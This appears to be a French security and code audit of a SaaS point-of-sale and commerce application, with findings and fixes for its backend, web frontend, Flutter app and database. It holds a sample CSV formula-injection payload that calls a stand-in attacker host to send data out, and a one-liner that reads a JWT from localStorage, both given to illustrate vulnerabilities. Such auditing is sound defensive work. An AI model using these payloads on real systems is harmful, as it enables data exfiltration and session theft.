# Audit complet — Gestion Commerciale SaaS

**Date :** 30 août 2026
**Portée :** l'intégralité du projet — backend Node.js/Express, frontend React (web), application mobile Flutter, base de données PostgreSQL — y compris tout le code jamais retouché dans les sessions récentes, pas seulement les dernières fonctionnalités ajoutées.
**Méthode :** quatre revues indépendantes en lecture seule (aucun fichier modifié, aucune écriture en base), une par périmètre, chacune ayant (1) revérifié concrètement le statut des constats des audits précédents (`AUDIT_PRODUCTION.md` et `SOLUTIONS_AUDIT_PRODUCTION.md`, tous deux du 3-6 août 2026) au lieu de faire confiance aux affirmations de l'époque, puis (2) fait un premier passage de sécurité/cohérence/robustesse sur tout le code jamais audité, notamment les fonctionnalités construites depuis (facturation, autorisations vendeur, export comptable, caisses, achats/fournisseurs, abonnements). Chaque constat ci-dessous cite un fichier et une ligne précise, ou une requête/preuve directe contre la base réelle — aucune affirmation vague.

**Ce document remplace/complète `AUDIT_PRODUCTION.md`** : la plupart de ses constats sont aujourd'hui résolus (voir chaque section « Constats des audits précédents »). Il ne réévalue pas la checklist de déploiement Render (`DEPLOIEMENT_PRODUCTION.md`), qui reste le document de référence pour la mise en ligne elle-même.

---

## Sommaire

1. [Résumé exécutif — priorités d'action](#1--résumé-exécutif--priorités-daction)
2. [Backend Node.js](#2--backend-nodejs)
3. [Frontend React (web)](#3--frontend-react-web)
4. [Application mobile Flutter](#4--application-mobile-flutter)
5. [Base de données PostgreSQL](#5--base-de-données-postgresql)
6. [Décompte global](#6--décompte-global)

---

## 1 — Résumé exécutif — priorités d'action

**La bonne nouvelle d'abord :** la quasi-totalité des 10 recommandations critiques du dernier audit (3-6 août) sont réellement résolues, pas seulement déclarées — Git existe, le secret JWT n'a plus de repli, les sessions sont révocables instantanément (`token_version`), les migrations sont tracées et rejouables, le rate limiting de connexion est en place, le module mort `stock` a disparu, la confusion de nommage fournisseurs/achats a été activement corrigée (renommage explicite), et les caisses/achats sont passés de schéma vide à fonctionnalités réelles. C'est un socle sain.

**Ce qui mérite une action, par ordre de priorité réelle :**

1. **[CRITIQUE — Base de données] `cash_drawers` et `customer_payments` n'ont aucun trigger d'immuabilité.** Ce sont deux registres financiers (fond de caisse, encaissements clients) qui peuvent aujourd'hui être modifiés ou supprimés après coup sans laisser de trace, contrairement à `orders`/`stock_movements`/`system_logs` qui sont protégés par le même mécanisme déjà existant dans le projet. Correctif trivial (réutiliser la fonction `prevent_update_delete()` déjà écrite). Voir §5.

2. **[CRITIQUE — Base de données] Suppression en cascade incohérente d'une boutique.** `orders`, `purchase_orders` et `cash_drawers` sont en `ON DELETE CASCADE` sur `stores`, mais `customer_payments` bloque la suppression (`RESTRICT`). Une boutique sans aucun paiement client enregistré pourrait aujourd'hui être supprimée avec tout son historique de ventes/achats/caisses effacé silencieusement — à l'opposé de la philosophie « aucune suppression physique des ventes » déjà affirmée ailleurs dans le projet. Aucune route ne permet actuellement de supprimer une boutique, donc le risque est latent, pas exploité — mais à corriger avant qu'une telle route existe. Voir §5.

3. **[MAJEUR — Backend] Injection de formule CSV dans l'export comptable.** Un nom de client ou de vendeur commençant par `=`, `+`, `-` ou `@` s'exécute comme une formule quand le Owner ouvre l'export dans Excel/LibreOffice — risque réel d'exfiltration ou d'exécution de commande côté poste du commerçant. Correctif d'une ligne. Voir §2.

4. **[MAJEUR — Backend] Messages d'erreur PostgreSQL bruts renvoyés au client en production**, y compris pour des scénarios plausibles (double ouverture de caisse concurrente, deux ventes simultanées sur le même numéro de commande). Voir §2.

5. **[MAJEUR — Frontend] Le jeton JWT est désormais persisté en clair dans `localStorage`** (changement réel et volontaire, documenté dans le code lui-même) — à assumer explicitement comme compromis produit, pas à corriger aveuglément, mais à connaître. Voir §3.

6. **[MAJEUR — Flutter, ×2]** Le build Android de release est encore signé avec la clé de debug (bloquant pour toute publication Play Store), et un motif systémique de `setState()` sans garde `mounted` dans ~30 blocs `catch` (dont des flux argent) risque des erreurs silencieuses après fermeture rapide d'un écran. Voir §4.

**Deux décisions produit toujours en attente** (déjà signalées le 6 août, toujours vraies aujourd'hui, aucune régression) : que faire de `stock_transfers` et `invoices`, deux tables toujours à l'état de schéma pur sans une ligne de code applicatif.

**Aucune faille critique d'isolation multi-boutique n'a été trouvée** dans le code applicatif (backend, frontend, mobile) — chaque requête vérifiée scope correctement par `store_id`. C'est le point le plus rassurant de cet audit.

---

## 2 — Backend Node.js

*Périmètre : `backend/` (Express 5, PostgreSQL via `pg`, sans ORM). 43 migrations SQL, 19 modules dans `src/modules/`.*

### 2.1 — Constats des audits précédents, statut vérifié

| # | Constat (3-6 août) | Statut | Preuve |
|---|---|---|---|
| 1 | Secret JWT avec repli codé en dur | ✅ **Résolu confirmé** | `backend/src/config/env.js:54` — `secret: required('JWT_SECRET')`, échec bruyant au démarrage si absent |
| 2 | Pas de révocation immédiate de session | ✅ **Résolu confirmé** | `backend/src/middlewares/auth.js:42-49` — `token_version` revérifié en base à chaque requête ; incrémenté au retrait d'employé, à la révocation/promotion Super Admin, à la suspension de boutique, au changement de mot de passe |
| 3 | `customer_payments` / `UNIQUE(owner_id)` absents des migrations | ✅ **Résolu confirmé** | `backend/database/24_reparation_schema.sql` — création idempotente + contrainte, et 5 autres écarts comblés en prime |
| 4 | Module mort `backend/src/modules/stock/` | ✅ **Résolu confirmé** | Dossier supprimé, plus aucune référence (active ou commentée) dans `routes/index.js` |
| 5 | Migrations manuelles non tracées | ✅ **Résolu confirmé** | `backend/database/run-migrations.js` + table `schema_migrations`, transaction par fichier |
| 6 | Confusion `suppliers`/`purchases` vs `store_supplier_links` | ✅ **Résolu, mieux que demandé** | `database/28_commandes_achat_premium.sql:38-40` renomme explicitement `suppliers→supplier_contacts`, `purchases→purchase_orders`, `purchase_items→purchase_order_items` ; plus aucune référence aux anciens noms dans le code |
| 7 | `cash_drawers` schéma-only | ✅ **Résolu confirmé** | `backend/src/modules/cashDrawers/` complet, intégré aux ventes CASH |
| 8 | `stock_transfers` / `invoices` schéma-only | ⏳ **Toujours en attente** | Aucune ligne de code dans `src/modules/` pour ni l'une ni l'autre — décision produit toujours non tranchée, pas une régression |
| 9 | Pas de rate limit dédié login/register | ✅ **Résolu, étendu** | `auth.routes.js:27-41` — 10/15min sur register/login, plus un second limiteur sur vérification e-mail/reset mot de passe |
| 10 | Prisma non nettoyé | ✅ **Résolu confirmé** | Ni `prisma` ni `@prisma/client` dans `package.json` |

### 2.2 — Nouveaux constats — sécurité

**🟠 MAJEUR — Injection de formule CSV/Excel dans l'export comptable**
`backend/src/modules/orders/ordersExport.js:45-51` (`csvCell`) échappe correctement guillemets/virgules/retours à la ligne (RFC 4180) mais ne neutralise jamais une cellule commençant par `=`, `+`, `-` ou `@`. `order.customerName` (saisi librement à la création d'un client) et `order.sellerName` passent tels quels.
*Scénario :* un client (ou complice) enregistré sous le nom `=HYPERLINK("http://attaquant.example/"&A1,"Cliquez")` ; quand le Owner exporte ses ventes et ouvre le fichier dans Excel, la formule s'exécute sur son poste.
*Correctif :* si `/^[=+\-@]/.test(str)`, préfixer d'une apostrophe avant l'échappement RFC 4180 déjà en place.

**🟠 MAJEUR — Messages d'erreur PostgreSQL bruts renvoyés au client, y compris en production**
`backend/src/middlewares/errorHandler.js:32-38` : seul `stack` est conditionné par `NODE_ENV`, mais `message: err.message` (ligne 35) part toujours tel quel pour toute erreur non enveloppée dans un `AppError`. Deux chemins concrets y mènent :
- `backend/src/modules/cashDrawers/cashDrawers.service.js:48-54` (`openDrawer`) — aucun `try/catch` autour de l'`INSERT`, alors qu'un index unique (`uq_cash_drawers_one_open_per_user`) existe précisément pour bloquer une double ouverture concurrente (double-clic, deux onglets). Le message métier propre `DRAWER_ALREADY_OPEN` existe déjà pour le cas séquentiel mais n'est jamais atteint dans ce cas.
- `backend/src/modules/orders/orders.service.js:363-370` — le `catch` du bloc transactionnel de `createOrder` fait `ROLLBACK` puis `throw err` brut (voir la condition de course ci-dessous, qui emprunte exactement ce chemin).
*Correctif :* dans `errorHandler.js`, ne jamais renvoyer `err.message` tel quel pour une erreur qui n'est pas une instance d'`AppError` — message générique côté client, détail conservé uniquement dans les logs serveur.

**🟡 MINEUR — Énumération d'e-mail via le message « compte non vérifié »**
`backend/src/modules/auth/auth.service.js:395-401` révèle qu'un compte existe (avant vérification du mot de passe), alors que le reste du flux reste volontairement générique. Compromis assumé et déjà commenté dans le code — vecteur d'énumération résiduel à bas risque, aucune action requise sauf exigence explicite de confidentialité.

**🟡 MINEUR — Pas de rate limit dédié sur la génération de Facture PDF**
`backend/src/modules/orders/orders.routes.js:59` (`/orders/:id/invoice-pdf`) ne porte que la limite globale (300/15min/IP), contrairement à `/uploads/image` qui a la sienne. Chaque génération peut déclencher une résolution DNS + `fetch()` sortant (logo boutique) et un rendu PDFKit — jusqu'à 300 fois en 15 min pour un compte compromis. Risque limité (authentifié, scope à une boutique), mais un rate-limiter dédié (30-60/15min) serait cohérent avec le traitement déjà appliqué ailleurs.

### 2.3 — Nouveaux constats — cohérence et code mort

- **`backend/src/middlewares/auth.js:140-202`** — ~62 lignes de l'ancienne implémentation de `requireAuth`/`requireRole` (avant `token_version`) restent commentées en bas du fichier. Sans risque mais nuit à la lisibilité — à supprimer.
- **`backend/src/routes/index.js:36`** — `// router.use('/users', require('../modules/users/users.routes'));` : le module `users/` n'existe pas. Vestige inactif à retirer.
- *(Positif)* Les tables `suppliers`/`purchases`/`purchase_items` d'origine (`database/04_fournisseurs_et_achats.sql`) sont orphelines depuis leur renommage par la migration 28 — sans impact (l'ordre d'exécution garantit que 28 s'applique toujours après 04), mais une note dans le fichier 04 renvoyant vers 28 aiderait un futur lecteur.

### 2.4 — Nouveaux constats — robustesse

**🟠 MAJEUR — Condition de course sur la génération de `order_number`**
`backend/src/modules/orders/orders.service.js:247-253` : le numéro de vente est calculé par `SELECT COALESCE(MAX(...), 0) + 1 ... WHERE store_id = $1`, à l'intérieur d'une transaction en isolation READ COMMITTED (par défaut PostgreSQL). Deux caissiers qui valident une vente au même instant dans la même boutique peuvent lire le même `MAX` avant que l'un des deux ne commite — l'index unique `uq_orders_store_number` empêche la corruption de données, mais la seconde transaction échoue avec une violation de contrainte brute (23505), non interceptée spécifiquement (voir constat sécurité ci-dessus) : le caissier voit un message technique au lieu d'un message clair, et doit ressaisir la vente. Pas de désynchronisation de stock (l'insertion de la commande précède la décrémentation).
*Comparer avec* `ensureInvoiceNumber` (`orders.service.js:619-635`), qui gère exactement ce problème correctement via un compteur dédié incrémenté atomiquement (`UPDATE ... RETURNING`) — **modèle à répliquer** pour `order_number`, ou a minima intercepter le code 23505 et relancer une fois avec un nouveau numéro.

**Bonnes pratiques confirmées** — transactions avec verrouillage explicite correctement implémentées : décrémentation de stock atomique dans `createOrder` (`orders.service.js:310-316`), `SELECT ... FOR UPDATE` dans `adjustStock` (`products.service.js:474`), verrouillage client + commandes impayées dans `recordPayment` (`customers.service.js:198,220`), `FOR UPDATE OF po` empêchant une double réception de commande d'achat (`purchases.service.js:465`).

**🟡 MINEUR — `openDrawer` : vérification « déjà ouverte » hors transaction**
`backend/src/modules/cashDrawers/cashDrawers.service.js:34-54` : le `SELECT` puis l'`INSERT` sont deux requêtes séparées sans verrou — protégé in extremis par l'index unique, mais l'échec ressort comme une erreur SQL brute (cf. §2.2) plutôt que le message métier déjà écrit.

**Couverture de validation** : sur 18 fichiers `*.routes.js`, seuls `dashboard.routes.js` et `uploads.routes.js` n'utilisent pas `express-validator` — dans les deux cas justifié (validation manuelle par regex, ou par contenu réel du fichier). Aucune route trouvée acceptant une entrée non validée pouvant atteindre du SQL brut.

**Isolation multi-boutique** : échantillon vérifié sur 7 modules (notes, clients, produits, ventes, achats, caisses, les 6 fonctions `canUserManageX`) — toutes les requêtes UPDATE/DELETE/SELECT ciblant une ressource par ID incluent systématiquement `store_id` dans la clause `WHERE`. Aucune fuite cross-tenant détectée.

### 2.5 — Dépendances

16 dépendances de production, toutes utilisées et justifiées. `cookie-parser` est chargé mais fonctionnellement inutile (l'authentification se fait exclusivement par en-tête `Authorization: Bearer`, jamais par cookie) — faible priorité de nettoyage, aucun risque. `pdfkit` est nouveau depuis le dernier audit et cohérent avec son usage. Rien de dupliqué ni de suspect.

---

## 3 — Frontend React (web)

*Périmètre : `frontend/src` (React 19, Vite, Zustand).*

### 3.1 — Constats des audits précédents, statut vérifié

| # | Constat | Statut | Preuve |
|---|---|---|---|
| 1 | Fichier orphelin `fournisors/fournisseur.page.jsx` (syntaxe invalide) | ✅ **Résolu** | Le fichier n'existe plus |
| 2 | Aucun bouton Annuler/Retourner une vente malgré un backend prêt | ✅ **Résolu, bien implémenté** | `OrderDetailModal.jsx:214-230` (`handleVoid`), `ReturnOrderModal.jsx` (retour total/partiel séquentiel, avec commentaire explicite sur le risque de parallélisation côté serveur) ; conditionné par rôle/statut, `window.confirm` avant action irréversible |
| 3 | Jeton JWT gardé en mémoire seule (aucune persistance) | ⚠️ **Situation changée, confirmée factuellement** | Voir ci-dessous |

**Sur le point 3 :** `frontend/src/store/authStore.js:27-28,145-155` — le store est désormais enveloppé dans le middleware `persist` de Zustand, avec `partialize` persistant explicitement `token, user, stores, activeStore` dans `localStorage` (clé `auth-storage`). Le token est donc **en clair, lisible par n'importe quel script exécuté dans la page**. Le fichier contient lui-même, commenté, l'ancienne version sans persistance (lignes 173-265) — ce n'est pas un oubli, c'est une transition assumée et documentée (confort : survivre à un rechargement de page). Voir finding sécurité ci-dessous.

### 3.2 — Nouveaux constats — sécurité

**🟠 MAJEUR — Jeton JWT persistant en clair dans `localStorage`**
`frontend/src/store/authStore.js:145-155` + `frontend/src/services/apiClient.js:21-27`.
*Scénario :* une XSS ailleurs dans l'app (dépendance tierce future, extension de navigateur compromise) ou un accès physique furtif à un poste partagé en boutique peut exécuter `JSON.parse(localStorage.getItem('auth-storage')).state.token` et exfiltrer un jeton valide jusqu'à expiration, sans toucher au réseau ni déclencher d'alerte serveur. Aucun `dangerouslySetInnerHTML`/`innerHTML` n'existe aujourd'hui dans le code (voir plus bas), donc le risque XSS « maison » est faible actuellement — mais toute librairie tierce future chargée dynamiquement hériterait du même accès.
*Piste :* documenter le compromis (déjà fait dans le code) ; pour un vrai renforcement, un cookie `httpOnly`/`SameSite=strict` côté backend serait nécessaire (hors périmètre frontend seul).

**Recherche exhaustive, aucun résultat :** `dangerouslySetInnerHTML`, `innerHTML =`, `eval`/`Function()` — zéro occurrence dans tout `frontend/src`. React échappe donc par défaut tout contenu utilisateur affiché (nom boutique/produit/client, notes, en-tête/pied de reçu, champs légaux facture) sans exception trouvée. Les seuls rendus « hors-React » sont `receiptPdf.js` (dessin canvas PDF, pas de DOM) et `videoEmbed.js` (iframe dont le hostname est strictement allowlisté YouTube/Vimeo). Les 3 occurrences de `target="_blank"` ont toutes `rel="noopener noreferrer"`.

**Bonne pratique confirmée** — le montant d'un paiement d'abonnement n'est jamais envoyé par le client (`SubscriptionPaymentModal.jsx:72-77` n'envoie que `planId`/`paymentMethod`/référence ; le montant est toujours recalculé serveur).

**🟡 MINEUR — 7 points à vérification croisée côté backend** (aucune preuve de faille depuis le frontend seul, mais signalés pour cross-check) :
- Le verrou `product.locked` (`PosPage.jsx:172-177`) ne bloque l'ajout au panier qu'à l'UI — à confirmer que `POST /orders` revérifie bien le plafond de produits actifs du plan (déjà confirmé sain par l'audit backend, §2.4 « isolation multi-boutique » couvre indirectement ce point).
- Les 6 permissions vendeur (`stock-settings`, `suppliers-settings`, `purchases-settings`, `void-return-settings`, `edit-price-settings`, `add-product-settings`, visibles dans `AuthorizationModal.jsx:9-62`) sont chacune à revérifier au niveau de leur route d'action correspondante (déjà fait côté backend, §2.4).

**🟡 MINEUR — `logout()` vide le state mais ne supprime pas la clé `localStorage`**
`frontend/src/store/authStore.js:126-139` : le state est remis à vide, et `persist` réécrit la clé en conséquence — donc `token: null` est bien persisté, pas de rejeu possible. Simple remarque : « vidé » ≠ « clé supprimée », utile si un futur audit cherche la clé.

### 3.3 — Nouveaux constats — cohérence et code mort

**Aucun fichier orphelin trouvé** — toutes les 26 routes de `App.jsx` correspondent à des fichiers présents, tous les sous-composants/modales sont importés au moins une fois. Contrairement à l'audit précédent, rien à supprimer cette fois.

**🟡 MINEUR — Duplication de patron dans 6 composants `*PermissionSync.jsx`**
`AddProductPermissionSync.jsx`, `EditPricePermissionSync.jsx`, `ManageStockPermissionSync.jsx`, `ManageSuppliersPermissionSync.jsx`, `ManagePurchasesPermissionSync.jsx`, `VoidReturnPermissionSync.jsx` suivent très probablement le même patron (un `GET /stores/my-*-permission` au montage, écriture dans le store correspondant). Candidat naturel de factorisation (un seul composant paramétré), à la manière dont `AuthorizationModal.jsx` a déjà factorisé sa table `PERMISSIONS`. Pas un bug — piste de simplification avant qu'une 7e permission ne recopie encore le même fichier.

### 3.4 — Nouveaux constats — robustesse

**🟡 MINEUR — Absence du pattern `cancelled`/cleanup dans 4 composants récents, incohérent avec le reste du projet**
Le projet a un précédent établi (`OrderDetailModal.jsx:61-72`, `PlanStatusBanner.jsx:25-40` utilisent un flag `cancelled` avec cleanup et un commentaire explicite sur le risque de setState après démontage). Ne le suivent pas :
- `AuthorizationModal.jsx:86-107` — fermeture rapide du modal pendant que 7 requêtes sont en vol → avertissement React (setState après démontage), fuite mémoire mineure.
- `SubscriptionPlansPage.jsx:43-62`, `BillingSettingsSection.jsx:30-43`, `CreatePurchaseOrderModal.jsx:23-35` — même absence.
Aucun bug fonctionnel grave (React 18+ tolère l'appel), mais une régression de discipline à corriger par cohérence — le prochain développeur qui copie l'un de ces fichiers comme modèle propagera l'oubli.

**Gestion d'erreur : cohérente et robuste** sur tout le périmètre vérifié (9 fichiers représentatifs) — `err.response?.data?.error?.message || '...'` systématique, protège correctement contre une erreur réseau pure sans `response`. Aucun `catch` vide masquant une erreur utilisateur (sauf `PlanStatusBanner.jsx`, silence volontaire et documenté).

**Accessibilité — `Switch.jsx` correct** : `role="switch"`, `aria-checked`, `aria-label` obligatoire côté appelant, clavier natif (vrai `<button>`). Boutons de fermeture de modale cohérents partout (`aria-label="Fermer"`).

**Bundle** : chunk JS unique >1,1 Mo (gzip ~305 Ko), aucun `React.lazy`/code-splitting par route dans `App.jsx`. Non bloquant, noté pour mémoire.

### 3.5 — Dépendances

**🟡 MINEUR — `jwt-decode` (`^4.0.0`) déclarée mais jamais importée** nulle part dans `src` (recherche exhaustive, zéro résultat). Le store garde le payload utile séparément de la réponse de login plutôt que de décoder le token. Candidat direct à `npm uninstall jwt-decode`.

Reste des dépendances (8 + 8 dev) toutes confirmées utilisées et cohérentes avec la stack (Tailwind v4 + Vite + oxlint).

---

## 4 — Application mobile Flutter

*Périmètre : `mobile/lib`. Comparaison faite contre `frontend/src/routes/navigation.js` (référence de parité).*

### 4.1 — Écart de parité avec le web — état actuel

L'écart s'est **énormément refermé** depuis le 3 août (à l'époque : Fournisseurs, Notes, Superviser, journal d'audit, types de boutique, personnalisation du reçu, historique des ventes détaillé, tout l'espace Super Admin, et la bannière de plan étaient absents). Aujourd'hui :

| Fonctionnalité web | Sur Flutter ? | Détail |
|---|---|---|
| Tableau de bord, Caisse, Historique des caisses, Produits, Stock, Historique des ventes, Recette, Clients, Notes, Fournisseurs, Achats, Équipe, Paramètres, Contact | ✅ Oui | Route + page dédiée pour chacune, navigation filtrée par rôle/autorisations en miroir exact du web |
| Superviser, MARCHÉ, vitrine fournisseur inter-boutique, types de boutique, bandeau plan gratuit | ✅ Oui | Tous présents et correctement câblés |
| **Journal d'activité de sa propre boutique** | ❌ **Non** | Le composant existe (`audit_log_panel.dart`) mais n'est utilisé QUE pour consulter le journal d'une boutique *supervisée* — aucune route/nav pour qu'un Owner consulte le journal de sa propre boutique sur mobile, alors que c'est disponible sur web (`AuditLogPage.jsx`) |
| Espace Super Admin complet | ❌ Non | Absent en totalité — déjà connu depuis le 3 août, vraisemblablement un choix assumé (backoffice réservé au web) mais non documenté comme tel |
| `/settings/plans` comme route nommée | ⚠️ Partiel | Atteignable via `Navigator.push` mais pas deep-linkable comme côté web — détail mineur |

**Conclusion :** il ne reste que deux trous réels : le Journal d'activité de sa propre boutique (régression fonctionnelle réelle, contrairement au reste désormais aligné), et l'espace Super Admin (déjà connu, probablement volontaire).

### 4.2 — Nouveaux constats — sécurité

**🟠 MAJEUR — Build de release Android encore signé avec la clé debug**
`mobile/android/app/build.gradle.kts:32-38` :
```kotlin
release {
    // TODO: Add your own signing config for the release build.
    signingConfig = signingConfigs.getByName("debug")
}
```
Aucun `key.properties` ni fichier `.jks`/`.keystore`. Un `flutter build appbundle --release` aujourd'hui produit un binaire signé avec la clé de debug partagée du SDK Android — **impossible à soumettre au Play Store en l'état** (Google exige une clé de release propre), et représenterait un risque de contrefaçon si publié malgré tout. *(Ce point était déjà identifié comme reste à faire dans le fil de discussion Play Store — confirmé ici comme toujours bloquant.)*

**🟡 MINEUR — Aucun pinning de certificat** — posture standard et acceptable (pas un vrai défaut), noté comme demandé : `Dio` fait confiance à la chaîne de certificats système, `AppConfig.apiBaseUrl` pointe en dur en `https://`.

**Confirmé sain — jeton et stockage** : `flutter_secure_storage` (Keychain/Keystore) utilisé pour toute la session, aucun chemin alternatif d'écriture du jeton. `shared_preferences` n'est utilisé que pour le mode d'affichage Grille/Liste et le panier persistant — jamais pour une donnée de session. **Aucun `print`/`debugPrint`/logger nulle part dans `mobile/lib`** — le jeton et les corps de requête/réponse ne peuvent pas fuiter dans un crash-reporter/agrégateur de logs.

### 4.3 — Nouveaux constats — cohérence et code mort

**Aucun fichier orphelin trouvé** — chaque page top-level est routée, chaque feuille/dialogue est importée par au moins un appelant réel. Contrairement au web (où `fournisors/` avait été trouvé lors d'un audit précédent), rien d'équivalent côté mobile.

**🟡 MINEUR — Permissions Stock/Fournisseurs/Achats jamais revérifiées inline avant action** — mais **ce n'est pas une régression mobile** : le web fait exactement la même chose (seul `AuthorizationModal.jsx` lit ces clés, pas les pages d'action elles-mêmes) ; parité exacte confirmée. À la marge, un contrôle inline donnerait un message d'erreur plus élégant qu'un 403 serveur brut (le pattern existe déjà ailleurs dans le projet, ex. `pos_page.dart:405` pour `canEditPrice`) — amélioration UX possible, pas un manque de sécurité (déjà imposé côté serveur).

### 4.4 — Nouveaux constats — robustesse

**🟠 MAJEUR (systémique) — `setState()` dans un bloc `catch` sans garde `mounted`, alors que le `finally` voisin en a une**
Le pattern `try { await ... } on ApiException catch (err) { setState(...) } finally { if (mounted) setState(...) }` — garde présente dans le `finally`, **absente dans le `catch`** — est répété dans **~30 endroits sur ~25 fichiers**, dont des flux argent : annulation de vente (`sales/order_detail_sheet.dart:90-91`), retour d'article (`sales/return_order_sheet.dart:92-93`), soumission de paiement d'abonnement (`settings/subscription_payment_sheet.dart:112-113`), export CSV des ventes (`settings_page.dart:1508-1509`), ajustement de stock (`stock/adjust_stock_sheet.dart:75-76`), et une vingtaine d'autres écrans (profil, inscription, clients, notes, équipe, produits, achats, fournisseurs...).
*Scénario :* l'utilisateur ferme l'écran juste après avoir déclenché une action (retour arrière, navigation) pendant que la requête échoue en réseau → `setState()` sur un `State` déjà `dispose()` → `FlutterError` en debug, fuite silencieuse en release.
*Correctif homogène :* ajouter `if (!mounted) return;` au tout début de chaque branche `catch`, exactement comme c'est déjà fait dans le `try` et le `finally` voisins.

**Confirmé sain — les 4 écrans explicitement ciblés par cet audit sont propres** : `pos_page.dart`, `store_shell.dart` (bandeau plan + les 6 chargements de permission), `authorization_sheet.dart` (garde `mounted` présente y compris dans ses `catch` — n'a PAS le défaut ci-dessus) et `subscription_plans_page.dart`. Seul le flux d'export CSV de `settings_page.dart` présente le défaut décrit ci-dessus.

**🟡 MINEUR — Fichiers temporaires d'export jamais nettoyés, collision possible**
`mobile/lib/core/utils/share_file.dart` écrit sous un nom fixe (`export-ventes.csv` toujours identique, quelle que soit la période) et ne le supprime jamais après partage.
1. *Collision :* relancer un export avant que la feuille de partage précédente ait fini de lire le fichier peut écraser le contenu en cours de lecture — fichier partagé tronqué ou incorrect.
2. *Accumulation :* aucun `file.delete()` nulle part — chaque facture/export laisse un fichier définitivement dans le cache de l'app, jamais libéré par l'application elle-même.
*Correctif :* nom de fichier unique (timestamp/uuid) et/ou nettoyage du dossier temporaire au démarrage.

**Confirmé sain — réinitialisation complète de l'état à la déconnexion/changement de boutique**
`mobile/lib/state/auth_state.dart` — `logout()` (lignes 173-187) et `applyStoreSwitch()` (lignes 80-98) remettent bien à zéro les **sept** indicateurs (`canVoidReturn`, `canEditPrice`, `canAddProduct`, `canManageStock`, `canManageSuppliers`, `canManagePurchases`, `planBanner`), malgré leur accumulation au fil de plusieurs sessions de travail. Aucune fuite de permission/plan d'une boutique ou d'un utilisateur précédent trouvée.

### 4.5 — Dépendances et build

`pubspec.yaml` : toutes les dépendances récentes, justifiées, rien d'inutilisé ni dupliqué. `build.gradle.kts` : versions Kotlin/NDK modernes et cohérentes, `compileSdk`/`minSdk`/`targetSdk` délégués à Flutter (pas de valeur figée suspecte). Seul point réellement bloquant : la signature de release (§4.2).

---

## 5 — Base de données PostgreSQL

*Interrogée en lecture seule sur la base réelle (36 tables live, 41 fichiers de migration `00` à `43` avec un trou `13-15`, tous enregistrés dans `schema_migrations`).*

### 5.1 — Constats des audits précédents, statut vérifié

| # | Constat | Statut | Preuve |
|---|---|---|---|
| 1 | `customer_payments` + `UNIQUE(owner_id)` manquants | ✅ **Résolu confirmé** | Requête `pg_constraint` live : `uq_stores_owner_id`, `stores_owner_id_fkey`, table `customer_payments` présente |
| 2 | `stores.country` encodage corrompu | ✅ **Résolu confirmé** | `column_default = 'Guinée'::character varying` (UTF-8 correct) ; balayage de 134 défauts de colonnes + 60 contraintes CHECK : aucune autre corruption |
| 3 | Trou de numérotation `08`/`09` | ✅ **Résolu confirmé, mais nouveau trou** | `08`/`09` existent et sont appliqués — mais un nouveau trou **`13-15`** existe, non documenté, non tracké dans git |
| 4 | Traçabilité migrations vs base live | ✅ **Résolu confirmé** | `schema_migrations` = 41 lignes, correspondance exacte avec les 41 fichiers présents, aucun écart dans un sens ou l'autre |
| 5 | `cash_drawers`/`purchases` schéma-only | ✅ **Résolu pour ces deux** | Code applicatif réel confirmé, 10 et 20 lignes live respectivement |
| 5 (suite) | `stock_transfers`/`invoices` schéma-only | ⏳ **Toujours vrai, inchangé** | Recherche exhaustive : aucune occurrence dans `backend/src/` ni `frontend/src/`, 0 ligne live pour les deux |

### 5.2 — Liste complète des 41 migrations et anomalies

Table complète vérifiée fichier par fichier (00 à 43, trou 13-15) — voir le rapport source pour le détail ligne par ligne. Points notables :
- **`04_fournisseurs_et_achats.sql`** crée `suppliers`/`purchases`/`purchase_items`, renommées plus tard par la migration 28.
- **`06_multi_boutiques.sql`** crée `stock_transfers` (toujours 0 usage). **`07_systeme_et_facturation.sql`** crée `invoices` (toujours 0 usage) — à ne pas confondre avec la fonctionnalité de facturation réelle (`42_facturation_boutique.sql`), qui ajoute des colonnes à `stores`/`orders` et est activement utilisée.
- **`21_abandon_role_manager.sql`** admet en commentaire que le rôle `MANAGER` avait déjà été retiré « à un moment non documenté » avant que la contrainte CHECK ne soit resserrée — même pattern historique que l'écart `customer_payments`/`owner_id` d'origine. Aucun impact actuel détecté.
- **`37_purge_comptes_non_verifies.sql`** *(positif à noter)* documente un vrai bug trouvé et corrigé proprement : une purge de comptes non vérifiés se heurtait au trigger d'immuabilité générique via les FK `ON DELETE SET NULL` de `system_logs`/`stock_movements` ; le correctif ajoute une exception précise (vérifiée colonne par colonne) n'autorisant que le passage de `user_id` à `NULL`, sans affaiblir l'immuabilité du reste. Bon exemple de rigueur.

**🟡 MINEUR — Non-idempotence hors script tracké** : seuls 2 fichiers sur 41 (`24_reparation_schema.sql`, `26_revocation_session.sql`) utilisent `IF NOT EXISTS`. Tous les autres `ALTER TABLE ADD COLUMN` (25+ occurrences) échoueraient s'ils étaient rejoués manuellement. `run-migrations.js` protège contre ce cas via `schema_migrations`, **mais le `README.md` du dossier documente encore une méthode `psql -f` manuelle fichier par fichier qui ne consulte jamais cette table** — un opérateur suivant cette procédure sur une base à jour casserait tout au premier `ADD COLUMN` sans garde.

**🟡 MINEUR — `README.md` obsolète** : ne documente que les migrations `00` à `07`, alors que 34 fichiers supplémentaires existent (facturation, marketplace, abonnements, permissions par employé...).

**🟡 MINEUR — Noms de contraintes/index obsolètes après le renommage de la migration 28** : `purchase_orders` porte encore des contraintes nommées `purchases_status_check`, `purchases_store_id_fkey`, `purchase_items_pkey`, etc. Purement cosmétique (PostgreSQL ne s'en soucie pas), mais source de confusion pour quiconque lit `pg_constraint` en pensant que ces objets appartiennent à une table `purchases`.

**Index redondant** : `users` a deux index uniques qui se chevauchent (`users_email_key` sur `email`, `idx_users_email_lower` sur `lower(email)`) — le second implique déjà l'unicité garantie par le premier. Non bloquant, coût de maintenance superflu.

### 5.3 — Nouveaux constats — sécurité et intégrité des données

**🔴 CRITIQUE — `cash_drawers` sans aucun trigger d'immuabilité**
Requête sur `information_schema.triggers` : `cash_drawers` n'apparaît dans aucune ligne. N'importe quel code (ou accès direct base) peut `UPDATE`/`DELETE` une ligne après clôture de caisse, sans trace ni blocage — un fond de caisse falsifié après coup (dissimuler un manquant) passerait inaperçu, alors que `orders`/`order_items`/`stock_movements`/`system_logs`/`purchase_orders`/`purchase_order_items`/`stock_transfers` sont tous protégés.
*Correctif :* réutiliser directement `prevent_update_delete()` (déjà définie dans `00_extensions_et_fonctions.sql`) — `CREATE TRIGGER trg_cash_drawers_no_update_delete BEFORE UPDATE OR DELETE ON cash_drawers ...`, avec si besoin une exception ciblée pour la clôture légitime (même patron que `stock_movements`/`system_logs`).

